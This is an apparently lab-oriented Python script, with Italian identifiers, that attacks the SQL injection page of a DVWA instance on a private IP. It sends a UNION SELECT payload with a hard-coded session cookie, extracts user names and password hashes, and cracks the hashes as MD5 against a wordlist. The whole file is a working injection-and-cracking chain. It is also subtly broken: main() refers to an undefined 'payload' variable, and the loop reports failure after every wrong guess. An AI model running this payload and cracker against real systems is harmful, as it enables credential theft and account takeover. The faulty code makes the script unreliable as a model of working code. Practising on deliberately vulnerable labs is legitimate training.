import hashlib 
import requests  
import urllib3 
from bs4 import BeautifulSoup  

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())

URL = "http://192.168.66.120/dvwa/vulnerabilities/sqli/"  

CUSTOM_HEADERS = {"Cookie": "security=low; PHPSESSID=83701921837e0140ef4a8c757b5a0cc3"} 

PAYLOAD = ["' UNION SELECT first_name, password FROM users # "]

def confronta_hash(password, hash_da_decriptare):
    m = hashlib.md5()  
    m.update(password.encode()) 
    hash3 = m.hexdigest()
    if m.hexdigest() == hash_da_decriptare:  
        return True
    else:
        return False

def exploit_sqli(payload):
    params = {"id": payload, "Submit": "Submit"}  
    r = requests.get(URL, params=params, headers=CUSTOM_HEADERS)  
    soup = BeautifulSoup(r.text, "html.parser")  
    div = soup.find("div", {"class": "vulnerable_code_area"})  

    if not div:  
        print("payload =", payload)
        print("errore =", r.text)
        return []

    return div.find_all("pre") 
def main():
    print()

    with open('/home/kali/Desktop/passwords.txt', 'r') as file:
        passwords = file.read().splitlines()  

        results = exploit_sqli(payload)

    if len(results) > 0:
        print("payload =", payload)

        for res in results:
            l = res.decode_contents().split("<br/>")
            hash_line = l[2].strip() 
            hash_da_decriptare = hash_line.split(": ")[1].strip()  
            for password in passwords:
                if confronta_hash(password, hash_da_decriptare):
                    print(f"   {l[1]}, Password trovata: {password} ====> ({hash_da_decriptare})")
                    break 
                else:
                    print(f"   {l[1]}, Password non decriptata ({hash_da_decriptare})")


if __name__ == "__main__":
    main()
